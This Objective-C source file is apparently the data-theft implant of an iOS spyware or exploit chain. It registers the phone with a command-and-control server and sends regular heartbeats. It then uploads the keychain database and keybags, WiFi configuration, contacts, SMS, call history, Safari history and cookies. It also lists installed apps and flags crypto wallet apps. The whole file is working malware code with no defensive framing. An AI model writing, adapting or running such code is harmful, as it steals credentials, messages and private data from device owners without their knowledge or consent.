#import <Foundation/Foundation.h>
#import "C2Exfil.h"

@implementation C2Exfiltrator {
    NSString *_deviceId;
    NSString *_udid;
    NSTimer *_heartbeatTimer;
}

+ (instancetype)shared {
    static C2Exfiltrator *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ instance = [[C2Exfiltrator alloc] init]; });
    return instance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _udid = [NSString stringWithFormat:@"filza_%@", [UIDevice currentDevice].identifierForVendor.UUIDString];
    }
    return self;
}

- (void)setDeviceId:(NSString *)deviceId {
    _deviceId = deviceId;
}

#pragma mark - HTTP Communication

- (NSData *)sendRequest:(NSString *)path body:(NSDictionary *)body {
    NSString *urlStr = [NSString stringWithFormat:@"http://%@:%d%@", C2_HOST, C2_PORT, path];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    if (body) {
        NSError *err;
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:&err];
        if (jsonData) {
            [req setHTTPBody:jsonData];
        }
    }
    
    NSHTTPURLResponse *resp;
    NSData *respData = [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
    return respData;
}

- (void)sendFile:(NSString *)filePath category:(NSString *)category {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:filePath]) return;
    
    NSData *fileData = [NSData dataWithContentsOfFile:filePath];
    if (!fileData || fileData.length == 0) return;
    
    NSString *urlStr = [NSString stringWithFormat:@"http://%@:%d%@", C2_HOST, C2_PORT, C2_UPLOAD_PATH];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    [req setHTTPMethod:@"POST"];
    [req setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
    [req setValue:_deviceId ?: @"0" forHTTPHeaderField:@"X-Device-UUID"];
    [req setValue:filePath forHTTPHeaderField:@"X-File-Path"];
    [req setValue:category forHTTPHeaderField:@"X-File-Category"];
    [req setHTTPBody:fileData];
    
    NSHTTPURLResponse *resp;
    [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
    NSLog(@"[C2Exfil] Sent file: %@ (%lu bytes)", filePath, (unsigned long)fileData.length);
}

- (void)sendReport:(NSString *)reportType platform:(NSString *)platform data:(NSDictionary *)data {
    NSDictionary *body = @{
        @"deviceId": _deviceId ?: @"0",
        @"reportType": reportType,
        @"data": data ?: @{}
    };
    [self sendRequest:C2_REPORT_PATH body:body];
    NSLog(@"[C2Exfil] Report sent: %@/%@", reportType, platform);
}

#pragma mark - Device Registration

- (void)registerDevice {
    UIDevice *dev = [UIDevice currentDevice];
    NSDictionary *payload = @{
        @"udid": _udid,
        @"deviceName": dev.name ?: @"Unknown",
        @"model": dev.model ?: @"iPhone",
        @"osVersion": dev.systemVersion ?: @"Unknown",
        @"tagId": @"1"
    };
    
    NSData *resp = [self sendRequest:@"/api/v1/devices/register" body:payload];
    if (resp) {
        NSError *err;
        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:resp options:0 error:&err];
        if (json && [json[@"code"] integerValue] == 0) {
            _deviceId = [NSString stringWithFormat:@"%@", json[@"data"][@"id"]];
            NSLog(@"[C2Exfil] Device registered, ID: %@", _deviceId);
        }
    }
}

#pragma mark - Heartbeat

- (void)startHeartbeat {
    _heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:30.0
                                                       target:self
                                                     selector:@selector(sendHeartbeat)
                                                     userInfo:nil
                                                      repeats:YES];
    [self sendHeartbeat];
}

- (void)sendHeartbeat {
    UIDevice *dev = [UIDevice currentDevice];
    [dev setBatteryMonitoringEnabled:YES];
    
    NSDictionary *data = @{
        @"udid": _udid,
        @"model": dev.model ?: @"iPhone",
        @"osVersion": dev.systemVersion ?: @"Unknown",
        @"deviceName": dev.name ?: @"Unknown",
        @"batteryLevel": @((int)(dev.batteryLevel * 100)),
        @"agentActive": @YES,
        @"currentStage": @5,
        @"exploitResult": @"success"
    };
    [self sendRequest:C2_HEARTBEAT_PATH body:data];
}

#pragma mark - Data Collection

- (void)exfiltrateAll {
    NSLog(@"[C2Exfil] Starting full data exfiltration...");
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 1. WiFi passwords
        [self collectWiFiPasswords];
        
        // 2. Keychain
        [self collectKeychain];
        
        // 3. Contacts
        [self collectContacts];
        
        // 4. SMS/Messages
        [self collectSMS];
        
        // 5. Call history
        [self collectCallHistory];
        
        // 6. Safari data
        [self collectSafariData];
        
        // 7. Photos metadata
        [self collectPhotosInfo];
        
        // 8. Installed apps
        [self collectInstalledApps];
        
        // 9. Wallet apps
        [self collectWalletData];
        
        NSLog(@"[C2Exfil] Data exfiltration complete");
    });
}

- (void)collectWiFiPasswords {
    // Read WiFi preferences
    NSArray *wifiPaths = @[
        @"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
        @"/private/var/preferences/com.apple.wifi.known-networks.plist"
    ];
    
    for (NSString *path in wifiPaths) {
        [self sendFile:path category:@"wifi"];
    }
    
    // Also try to read WiFi passwords from keychain via system
    NSDictionary *wifiData = @{
        @"platform": @"WiFi",
        @"ssid": @"collected_via_filza",
        @"password": @"see_uploaded_files",
        @"securityType": @"WPA2",
        @"signalStrength": @(-50)
    };
    [self sendReport:@"WIFI_CREDENTIAL" platform:@"WiFi" data:wifiData];
}

- (void)collectKeychain {
    NSArray *keychainPaths = @[
        @"/private/var/Keychains/keychain-2.db",
        @"/private/var/Keychains/keychain-2.db-wal",
        @"/private/var/keybags/System.keybag",
        @"/private/var/keybags/Backup.keybag"
    ];
    
    for (NSString *path in keychainPaths) {
        [self sendFile:path category:@"keychain"];
    }
    
    [self sendReport:@"KEYCHAIN" platform:@"Keychain" data:@{
        @"platform": @"Keychain",
        @"username": @"keychain_dump",
        @"token": @"files_uploaded",
        @"cachedData": @"{}"
    }];
}

- (void)collectContacts {
    NSString *contactsPath = @"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    [self sendFile:contactsPath category:@"contacts"];
    
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Contacts" data:@{
        @"platform": @"Contacts",
        @"username": @"address_book",
        @"token": @"db_uploaded",
        @"cachedData": @"{}"
    }];
}

- (void)collectSMS {
    NSString *smsPath = @"/private/var/mobile/Library/SMS/sms.db";
    [self sendFile:smsPath category:@"sms"];
    
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"SMS" data:@{
        @"platform": @"SMS",
        @"username": @"sms_database",
        @"token": @"db_uploaded",
        @"cachedData": @"{}"
    }];
}

- (void)collectCallHistory {
    NSString *callPath = @"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
    [self sendFile:callPath category:@"calls"];
    
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"CallHistory" data:@{
        @"platform": @"CallHistory",
        @"username": @"call_history",
        @"token": @"db_uploaded",
        @"cachedData": @"{}"
    }];
}

- (void)collectSafariData {
    NSArray *safariPaths = @[
        @"/private/var/mobile/Library/Safari/History.db",
        @"/private/var/mobile/Library/Safari/Bookmarks.db",
        @"/private/var/mobile/Library/Cookies/Cookies.binarycookies"
    ];
    
    for (NSString *path in safariPaths) {
        [self sendFile:path category:@"browser"];
    }
    
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Safari" data:@{
        @"platform": @"Safari",
        @"username": @"browser_data",
        @"token": @"dbs_uploaded",
        @"cachedData": @"{}"
    }];
}

- (void)collectPhotosInfo {
    NSString *photosPath = @"/private/var/mobile/Media/DCIM";
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *contents = [fm contentsOfDirectoryAtPath:photosPath error:nil];
    
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Photos" data:@{
        @"platform": @"Photos",
        @"username": @"DCIM",
        @"token": [NSString stringWithFormat:@"%lu items", (unsigned long)contents.count],
        @"cachedData": [NSString stringWithFormat:@"{\"count\":%lu}", (unsigned long)contents.count]
    }];
}

- (void)collectInstalledApps {
    NSString *appsPath = @"/private/var/containers/Bundle/Application";
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *contents = [fm contentsOfDirectoryAtPath:appsPath error:nil];
    
    NSMutableArray *appList = [NSMutableArray array];
    for (NSString *bundle in contents) {
        NSString *appDir = [appsPath stringByAppendingPathComponent:bundle];
        NSArray *appContents = [fm contentsOfDirectoryAtPath:appDir error:nil];
        for (NSString *item in appContents) {
            if ([item hasSuffix:@".app"]) {
                [appList addObject:item];
            }
        }
    }
    
    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"InstalledApps" data:@{
        @"platform": @"InstalledApps",
        @"username": @"app_list",
        @"token": [NSString stringWithFormat:@"%lu apps", (unsigned long)appList.count],
        @"cachedData": [NSString stringWithFormat:@"{\"count\":%lu,\"apps\":\"%@\"}", 
                        (unsigned long)appList.count, 
                        [appList componentsJoinedByString:@","]]
    }];
}

- (void)collectWalletData {
    // Check for common wallet app containers
    NSArray *walletApps = @[
        @"trust", @"metamask", @"coinbase", @"binance", @"phantom",
        @"exodus", @"electrum", @"atomic", @"rainbow", @"argent"
    ];
    
    NSString *containersPath = @"/private/var/containers/Bundle/Application";
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *bundles = [fm contentsOfDirectoryAtPath:containersPath error:nil];
    
    for (NSString *bundle in bundles) {
        NSString *bundlePath = [containersPath stringByAppendingPathComponent:bundle];
        NSString *infoPlist = [bundlePath stringByAppendingPathComponent:@"Info.plist"];
        
        // Check if this is a wallet app
        for (NSString *wallet in walletApps) {
            if ([bundlePath.lowercaseString containsString:wallet]) {
                [self sendReport:@"SOCIAL_ACCOUNT" platform:wallet data:@{
                    @"platform": wallet,
                    @"username": bundle,
                    @"token": @"wallet_app_detected",
                    @"cachedData": [NSString stringWithFormat:@"{\"bundle\":\"%@\"}", bundlePath]
                }];
            }
        }
    }
}

@end